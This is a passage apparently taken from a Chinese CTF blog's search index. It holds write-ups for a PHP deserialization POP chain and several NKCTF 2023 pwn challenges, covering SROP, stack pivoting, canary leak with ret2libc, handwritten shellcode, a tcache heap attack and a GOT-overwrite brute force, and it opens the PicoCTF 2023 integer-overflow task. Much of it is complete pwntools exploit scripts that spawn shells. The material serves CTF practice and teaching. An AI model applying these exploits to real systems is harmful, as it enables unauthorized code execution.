20 46 6C 61 67 21 E2 81 A9 E2 81 A6 4E 31 53 41 43 54 46  //参数\n\n%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46 //同上\n\npayload = ?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46\n\n","categories":["web"]},{"title":"NISACTF常态化题库","url":"/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/","content":"babypop这是一题简单的反序列化pop链构造\n &lt;?phpfunction show_me_flag()&#123;    system(&quot;tac /flag&quot;);&#125;error_reporting(0);class NISA&#123;    public $fun;    public function __wakeup()    &#123;        if($this-&gt;fun==&quot;show_me_flag&quot;)&#123;            die(&quot;rookie hacker plz go back and do your own homework!&quot;);        &#125;    &#125;    function __call($from,$val)&#123;        $this-&gt;fun=$val[0];    &#125;    public function __toString()    &#123;        call_user_func($this-&gt;fun);         return &quot; &quot;;    &#125;&#125;class Caller&#123;    public $ext;    public $x;    public function __wakeup()    &#123;        $this-&gt;ext-&gt;nisa($this-&gt;x);        echo $this-&gt;ext;    &#125;&#125;if(isset($_GET[&#x27;ser&#x27;]))&#123;    @unserialize($_GET[&#x27;ser&#x27;]);&#125;else&#123;    highlight_file(__FILE__);&#125; \n\n进行pop链构造 首先要确定结尾和起点\n这里看到了call_user_func和showmeflag 可以利用这里调用\n再看所属的方法名 是__toString 其是当对象被作为字符串时调用的\n也就是说echo 一个对象的时候 就会跳转到这个函数 所以这里看到caller的wakeup\n逐步刨析一下执行步骤\next为NISA类对象 \n这时候又会触发_call魔术方法 $x就被作为参数传给fun\n紧接着就是跳转到tostring 执行showmeflag函数\n&lt;?phpclass NISA&#123;\tpublic $fun ;&#125;class Caller&#123;\tpublic $ext;\tpublic $x = &quot;show_me_flag&quot;;&#125;$a = new NISA();$b = new Caller();$b -&gt; ext = $a;echo serialize($b);?&gt;\n\n得到flag\n","categories":["web"]},{"title":"NKCTF2023","url":"/2023/03/26/NKCTF/","content":"打的比较坐牢 主要还是有的题目没有给libc文件\n题目质量还是挺不错的 扩展了思路\nezshellcode这题老熟人了哈哈 还记得刚开始学pwn的时候 写的第一篇wp就是猜数字 顺便这题真的被坑了一手 一开始没仔细看题目 看到随机数就以为时间当种子 爆破半天发现是固定种子 默认1\n签到题 不解释了\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;u can make it in 5 min!&quot;)libc.srand(1)buf = libc.rand() % 100 + 1payload = cyclic(buf)+asm(shellcraft.sh())io.send(payload)io.recvuntil(&quot;good luck!&quot;)io.interactive()\n\na_story_of_a_pwner\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-Ch] BYREF  int v5; // [rsp+8h] [rbp-8h] BYREF  int v6; // [rsp+Ch] [rbp-4h] BYREF  init(argc, argv, envp);  puts(&quot;today, I want to tell you some stories about myself.&quot;);  puts(&quot;I have a lot of stories, which one do you want to hear?&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          menu();          if ( opt != 1 )            break;          acm(&amp;v6);          v6 = 1;        &#125;        if ( opt != 2 )          break;        ctf(&amp;v5);        v5 = 1;      &#125;      if ( opt != 3 )        break;      love(&amp;v4);      v4 = 1;    &#125;    if ( opt != 4 )      break;    if ( v6 &amp;&amp; v5 &amp;&amp; v4 )      heart();    else      warning(&amp;v6, &amp;v5, &amp;v4);  &#125;  puts(&quot;wrong choice.&quot;);  puts(&quot;you hurt me so much.&quot;);  puts(&quot;DO YOU THINK IT&#x27;S FUNNY TO CHOOSE INCORRECT OPTION?&quot;);  puts(&quot;BYE.&quot;);  return 0;&#125;\n\n一开始还以为是堆 跟进一下每个函数发现还是比较简单的\nacm ctf love三个函数每个函数进去可以往bss段上写0x8字节的数据 并且这三个位置是相邻的\n同时在函数执行完以后 会各自把一个值设置为1\n接着要进入heart函数的分支有两种情况 一种是值都为1 也就是已经执行完3个函数了 还有一种就是没有全部执行完\n跟进一下heart函数和warning函数\nssize_t heart()&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  puts(&quot;now, come and read my heart...&quot;);  return read(0, buf, 0x20uLL);&#125;\n\n可以溢出0x16字节 也就够个栈迁移了 联想到之前可以往bss段写数据 那就是往那边迁移了\nint warning()&#123;  puts(&quot;Before u read this, i think u should read first 3.&quot;);  return printf(&quot;I give it up, you can see this. %p\\n&quot;, &amp;puts);&#125;\n\n直接送了puts函数的真实地址 那就好办了 接收一下 然后在bss段上构造system(“&#x2F;bin&#x2F;sh”) 随后迁移过去\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,37719)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/lib# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;I give it up, you can see this. &quot;)puts_addr = int(io.recv(14),16)success(&quot;puts_addr :&quot;+hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))rdi_addr = 0x0000000000401573binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]leave_addr = 0x000000000040139e   io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;2&#x27;)io.send(p64(rdi_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;1&#x27;)io.send(p64(binsh_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;3&#x27;)io.send(p64(system_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recv()io.recv()onegadget_addr = libc_addr +0xe3b04payload = cyclic(10)+p64(0x4050A0-8)+p64(leave_addr)io.sendline(payload)io.interactive()\n\nez_stack\n__int64 vuln()&#123;  signed __int64 v0; // rax  signed __int64 v1; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_write(1u, nkctf, 0x26uLL);  v1 = sys_read(0, buf, 0x200uLL);  return 0LL;&#125;\n\n隐约记得哪一年的国赛也有这种类型的题目 记得是srop来着 翻了翻之前的博客 发现还真是(所以写写博客还是有用的对吧) \nROPgadget看看能不能控制rax的值 果然发现了 那这一题就是srop了\n\n不过还需要找个地方写binsh字符串 所以先srop写一个read到bss段上 然后再getshell\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/lib# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug():    gdb.attach(io)    pause()io.recv()bss_addr= 0x404080+0x100main_addr = elf.sym[&#x27;main&#x27;]rax_15 = 0x0000000000401146syscall_addr = 0x000000000040114eframe = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = bss_addrframe.rdx = 0x200frame.rip = syscall_addrframe.rsp = bss_addrpayload = cyclic(0x18)+p64(rax_15)+p64(syscall_addr)+bytes(frame)io.sendline(payload)binsh_addr = bss_addr +264frame = SigreturnFrame()frame.rax = 59frame.rdi = binsh_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrpayload = p64(rax_15)+p64(syscall_addr)+bytes(frame)+b&#x27;/bin/sh\\x00&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(rax_15))# pause(0)io.sendline(payload)io.interactive()\n\nbaby_rop\n__int64 vuln()&#123;  const char *format; // [rsp+8h] [rbp-118h]  char src[8]; // [rsp+10h] [rbp-110h] BYREF  char dest[8]; // [rsp+18h] [rbp-108h] BYREF  char v4[248]; // [rsp+20h] [rbp-100h] BYREF  unsigned __int64 v5; // [rsp+118h] [rbp-8h]  v5 = __readfsqword(0x28u);  strcpy(dest, &quot;Hello, &quot;);  puts(&quot;Welcome to the NKCTF message board!&quot;);  printf(&quot;What is your name: &quot;);  my_read(src, 8LL);  format = strcat(dest, src);  printf(format);  puts(&quot;What are your comments and suggestions for the NKCTF: &quot;);  my_read(v4, 256LL);  puts(&quot;Thank you, we will read your comments and suggestions carefully.&quot;);  return 0LL;&#125;\n\n格式化字符串 顺便还可以往栈上写数据 不过并不能栈溢出 一开始确实没什么思路 不过后来发现main函数结束前的指令有点不一样\n.text:000000000040138C                 endbr64.text:0000000000401390                 push    rbp.text:0000000000401391                 mov     rbp, rsp.text:0000000000401394                 mov     eax, 0.text:0000000000401399                 call    init.text:000000000040139E                 mov     eax, 0.text:00000000004013A3                 call    vuln.text:00000000004013A8                 leave.text:00000000004013A9                 mov     eax, 0.text:00000000004013AE                 pop     rbp.text:00000000004013AF                 retn\n\n\n最后rsp指向的是环境变量那一块 然后我就想能不能破坏一下栈结构 看能不能利用写栈上0x100的字节构造一个rop链\n然后就想到canary了嘛 调用___stack_chk_fail的话总归会对栈结构产生影响 再加上有格式化字符串漏洞 泄露canary还是小菜一碟的\nio.recvuntil(&quot;What is your name: &quot;)# gdb.attach(io,&#x27;b *0x401340&#x27;)io.sendline(b&#x27;%41$p%p&#x27;)io.recv(7)canary = int(io.recv(18),16)success(&quot;canary :&quot;+hex(canary))stack_addr = int(io.recv(14),16)success(&quot;stack_addr :&quot;+hex(stack_addr))\n\n计算一下偏移泄露canary 顺便不要浪费机会 顺便泄露一下栈地址 到时候还要用到binsh字符串呢\npayload = p64(ret_addr)*30+p64(main_addr)+p64(canary)gdb.attach(io,&#x27;b *0x40138B&#x27;)pause(0)io.send(payload)pause()\n\n然后试着覆盖一下canary 你就会发现最后的rsp会乱偏 为了提高打通的效率 我们就多塞几个ret 这样确保可以返回到main函数\n然后回到main函数以后 再次利用格式化字符串泄露libc基址 然后同样的办法构造system链就行了\n顺便吐槽一下不给libc的行为 2.31 9.9的用libcsearch也查不到 一血就这样没了 就拿了个三血\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,34395)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;What is your name: &quot;)# gdb.attach(io,&#x27;b *0x401340&#x27;)io.sendline(b&#x27;%41$p%p&#x27;)io.recv(7)canary = int(io.recv(18),16)success(&quot;canary :&quot;+hex(canary))stack_addr = int(io.recv(14),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;What are your comments and suggestions for the NKCTF: &quot;)main_addr = elf.sym[&#x27;main&#x27;]start_addr = elf.sym[&#x27;_start&#x27;]ret_addr = 0x000000000040101arsp_addr = 0x000000000040140dpayload = p64(ret_addr)*30+p64(main_addr)+p64(canary)io.send(payload)io.recvuntil(&quot;What is your name: &quot;)io.sendline(b&#x27;%25$p&#x27;)addr = int(io.recvuntil(&quot;What&quot;,drop = True)[-14:],16) success(&quot;addr :&quot;+hex(addr))#obj = LibcSearcher(&quot;_IO_2_1_stderr_&quot;,addr)libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]#obj.dump(&quot;_IO_2_1_stderr_&quot;)success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]rdi_addr = 0x0000000000401413binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)*28+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(canary)io.sendline(payload)io.recv()io.interactive()\n\n9961code\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [rsp+0h] [rbp-10h]  init(argc, argv, envp);  buf = (void *)(int)mmap((void *)0x9961000, 0x1000uLL, 7, 34, -1, 0LL);  puts(&quot;Last night i played touhou fuujinroku ~ Mountain of Faith\\n&quot;);  puts(&quot;F**k! I failed and 9961 in the end!\\n&quot;);  puts(&quot;In that case, you can only enter a very short shellcode!\\n&quot;);  read(0, buf, 0x16uLL);  puts(&quot;I hope you can NMNB it!&quot;);  mprotect(buf, 0x1000uLL, 4);  JUMPOUT(0x9961000LL);&#125;\n\n手写shellcode 一开始我是想着先构造mprotect 开一下0x9961000的可写可读权限 然后返回main函数重新构造read链 但是发现不行啊 开了pie不知道要怎么返回去 想了半天 问了其他师傅 学了一手直接打\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,36613)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;In that case, you can only enter a very short shellcode!&quot;)shellcode = &quot;&quot;&quot;    xor rsi,rsi    lea rdi,[r15+0xe]    cdq    mov ax,59    syscall&quot;&quot;&quot;# gdb.attach(io,&#x27;b *$rebase(0x139B)&#x27;)# pause(0)io.send(asm(shellcode)+b&#x27;/bin/sh\\x00&#x27;)io.recvuntil(&quot;I hope you can NMNB it!&quot;)io.interactive()\n\n学到了cdq这个指令 可以把eax第31位赋值给edx所有的bit 在这里也就是起到了清空rdx寄存器的作用\n值得一题的就是本地死活打不通 但是远程能通 不知道什么情况\nbaby_heap\n这题堆开局就给我来一记重锤 用xclibc换libc版本的时候 运行提示段内存错误\n\n然后发现是libc没有换上 那就手动换一下吧\npatchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 /home/chen/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/ ./pwn\n\n程序函数给齐了 add delete edit show\nadd函数最多申请0x100 delete函数置零了指针 不存在UAF edit函数存在一个字节的溢出 show函数可以打印出堆块内容\n还真是easy_heap 这题用到的办法是我最开始学堆的时候用的 利用单字节溢出合并两个chunk 释放到unsortedbin中 然后再申请同样size的小chunk出来就存在chunk overlap  只不过中途会有些小问题\nadd(0,0x18)add(1,0x40)add(2,0x40)for i in range(7):    add(3+i,0x90)for i in range(7):    delete(3+i)payload = cyclic(0x18)+b&#x27;\\xa1&#x27;edit(0,payload)delete(1)add(10,0x40)edit(2,b&#x27;\\x0a&#x27;)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-96-0xalibc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))\n\n一个是2.32的main_arena_addr+xxh末尾是\\x00 所以要先覆盖成其他值\n还有一点是接下来想再申请0x40的chunk 也就是chunk2 构成一个chunk overlap的时候 报错了\nmalloc(): unsorted double linked list corrupted\n\n是因为此时unsortedchunk的fd域被破坏了\n \n那简单 复原一下就好了\nedit(2,p64(main_arena_addr+96)*2)add(11,0x40)delete(11)show(2)key = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))edit(2,p64(free_hook^key))\n\n这时候就利用chunk overlap来实现tcachebin attack libc版本是2.32 所以还需要注意一下tcache的key机制\n但是这时候却申请不出来free_hook的chunk\n因为此时plmalloc认为这个链表中已经没有chunk了 前面的数值是0 再次申请不会去对应链表中查找 而是直接分配一个新的\n\n解决办法就是多释放几个进去就行了\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Enter the index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Enter the Size: &quot;)    io.sendline(str(size))def delete(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Enter the index: &quot;)    io.sendline(str(index))def edit(index,content):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Enter the index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Enter the content: &quot;)    io.sendline(content)def show(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Enter the index: &quot;)    io.sendline(str(index))add(0,0x18)add(1,0x40)add(2,0x40)for i in range(7):    add(3+i,0x90)for i in range(7):    delete(3+i)payload = cyclic(0x18)+b&#x27;\\xa1&#x27;edit(0,payload)delete(1)add(10,0x40)edit(2,b&#x27;\\x0a&#x27;)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-96-0xalibc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))edit(2,p64(main_arena_addr+96)*2)add(11,0x40)add(12,0x40)add(13,0x40)delete(11)show(2)key = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))add(14,0x40)delete(12)delete(13)delete(14)edit(2,p64(free_hook^key))add(15,0x40)add(3,0x40)edit(3,p64(system_addr))edit(15,b&#x27;/bin/sh\\x00&#x27;)delete(15)io.interactive()\n\nonly_read\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s1[64]; // [rsp+0h] [rbp-80h] BYREF  char s[64]; // [rsp+40h] [rbp-40h] BYREF  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x30uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;Welcome to NKCTF!&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x30uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;tell you a secret:&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x40uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x40uLL);  base_decode(s, s1);  if ( !strcmp(s1, &quot;can you find me?&quot;) )    next();  return 0;&#125;\n\n这题实在是太坐牢了 我自己尝试的是ogg爆破 本地关了ASLR以后 写对偏移就通了 但是远程是死活爆破不通 最后换了个办法 可惜了 我觉得我ogg爆破的办法是真的奇才\nfrom pwn import*from ctypes import *from LibcSearcher import*#io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)#context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()while True:    try:        io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)        io.sendline(b&#x27;V2VsY29tZSB0byBOS0NURiE=\\x00&#x27;)        sleep(0.2)        io.sendline(b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\\x00&#x27;)        sleep(0.2)        io.sendline(b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\\x00&#x27;)        sleep(0.2)        io.sendline(b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\\x00&#x27;)        sleep(0.2)        rbp_addr = 0x000000000040117d        leave_addr = 0x00000000004013c2        gadget1_addr = 0x401660        gadget2_addr = 0x401676        next_addr = 0x4013c4        payload = cyclic(0x38)+p64(gadget2_addr)        payload += cyclic(0x8)+p64(0)+p64(1)+p64(0)+p64(elf.got[&#x27;setbuf&#x27;])+p64(8)+p64(elf.got[&#x27;read&#x27;])        payload += p64(gadget1_addr)+p64(0)*7+p64(next_addr)        # gdb.attach(io,&#x27;b *0x4013E8&#x27;)        # pause(0)        sleep(0.2)        io.send(payload)        io.send(p16(0x3afe) + p8(0xea))        payload  = cyclic(0x38)+p64(rbp_addr)+p64(elf.got[&#x27;setbuf&#x27;]-0x8)+p64(leave_addr)        # gdb.attach(io,&#x27;b *&#x27;+str(rbp_addr))        # pause(0)        sleep(0.2)        io.send(payload)        sleep(0.2)        io.sendline(b&#x27;cat flag.txt&#x27;)        flag = io.recv()        assert(len(flag)&gt;0)        print(flag)        io.interactive()            except EOFError:        io.close()\n\n就贴在这了吧 纪念一下死去的理想\n说回正题 开局的那几个base64还是很好绕过的 要注意的是有的末尾要加了\\x00 不然不知道为啥过不了strcmp\n随后就是一个栈溢出 长度管够 但是只有这四个函数\n\n直接覆盖setbuf的got表为puts函数  然后把setbuf当puts使就行了\n注意一下爆破脚本 在前面那一堆payload传输的中间要加sleep 不然会出现奇怪的问题 我就是这个问题卡了好久的远程\nfrom pwn import*from ctypes import *from LibcSearcher import*#io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,31530)#context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()while True:    try:        io = process(&quot;./pwn&quot;)        #io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)        io.sendline(b&#x27;V2VsY29tZSB0byBOS0NURiE=\\x00&#x27;)        sleep(0.5)        io.sendline(b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\\x00&#x27;)        sleep(0.5)        io.sendline(b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\\x00&#x27;)        sleep(0.5)        io.sendline(b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\\x00&#x27;)        sleep(0.5)        rbp_addr = 0x000000000040117d        leave_addr = 0x00000000004013c2        gadget1_addr = 0x401660        gadget2_addr = 0x401676        read_addr = 0x401090        rsi_r15 = 0x0000000000401681        rdi_addr = 0x0000000000401683        main_addr = 0x4013E9        ret_addr = 0x000000000040101a        next_addr = 0x4013c4        payload = cyclic(0x38)+p64(rdi_addr)+p64(0)+p64(rsi_r15)+p64(elf.got[&#x27;setbuf&#x27;])*2+p64(elf.sym[&#x27;read&#x27;])+p64(rdi_addr)+p64(elf.got[&#x27;read&#x27;])+p64(elf.sym[&#x27;setbuf&#x27;])+p64(next_addr)        # gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))        # pause(0)        io.send(payload)        sleep(0.5)        # pause()        # gdb.attach(io,&#x27;b *0x4013C4&#x27;)        # pause(0)        io.send(p16(0x4420))        read_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))        libc_addr = read_addr  - libc.sym[&#x27;read&#x27;]        success(&quot;libc_addr :&quot;+hex(libc_addr))        system_addr = libc_addr + libc.sym[&#x27;system&#x27;]        binsh_addr = libc_addr + libc.search(b&quot;/bin/sh&quot;).__next__()        payload = cyclic(0x38)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)        io.send(payload)        io.sendline(b&#x27;cat flag.txt&#x27;)        flag = io.recv()        assert(len(flag)&gt;0)        print(flag)        io.interactive()            except EOFError:        io.close()\n\n","categories":["wp"]},{"title":"PicoCtf2023","url":"/2023/03/17/PicoCtf2023/","content":"第一次打国外的比赛 题型也都很新颖 记录一下做出来的题目\ntwo-sum签到题 考的是整形溢出 直接给了源码\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static int addIntOvf(int result, int a, int b) &#123;    result = a + b;    if(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; result &lt; 0)        return -1;    if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result &gt; 0)        return -1;    return 0;&#125;int main() &#123;    int num1, num2, sum;    FILE *flag;    char c;    printf(&quot;n1 &gt; n1 + n2 OR n2 &gt; n1 + n2 \\n&quot;);    fflush(stdout);    printf(&quot;What two positive numbers can make this possible: \\n&quot;);    fflush(stdout);        if (scanf(&quot;%d&quot;, &amp;num1) &amp;&amp; scanf(&quot;%d&quot;, &amp;num2)) &#123;        printf(&quot;You entered %d and %d\\n&quot;, num1, num2);        fflush(stdout);        sum = num1 + num2;        if (addIntOvf(sum, num1, num2) == 0) &#123;            printf(&quot;No overflow\\n&quot;);            fflush(stdout);            exit(0);        &#125; else if (addIntOvf(sum, num1, num2) == -1) &#123;            printf(&quot;You have an integer overflow\\n&quot;);            fflush(stdout);        &#125;        if (num1 &gt; 0 || num2 &gt; 0) &#123;            flag = fopen(&quot;flag.txt&quot;,&quot;r&quot;);            if(flag == NULL)&#123;                printf(&quot;flag not found: please run this on the server\\n&quot;);                fflush(stdout);                exit(0);            &#125;            char buf[60];            fgets(buf, 59, flag);            printf(&quot;YOUR FLAG IS: %s\\n&quot;, buf);            fflush(stdout);            exit(0);        &#125;    &#125;    return 0;&#125;\n\n我们直接输入sum1 sum2的值 只要满足两个判断式中的一个就行\nif(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; result &lt; 0)if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result &gt; 0)\n\n这里我选择打第一个判断式 只要a+b超过了无符号int型范围就行\n二者值都为2147483647即可\nbabygame01脑洞比较大的一道题 不过还在逻辑之内 好好分析一番\n\nida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+1h] [ebp-AA5h]  int v5[2]; // [esp+2h] [ebp-AA4h] BYREF  char v6; // [esp+Ah] [ebp-A9Ch]  char v7[2700]; // [esp+Eh] [ebp-A98h] BYREF  unsigned int v8; // [esp+A9Ah] 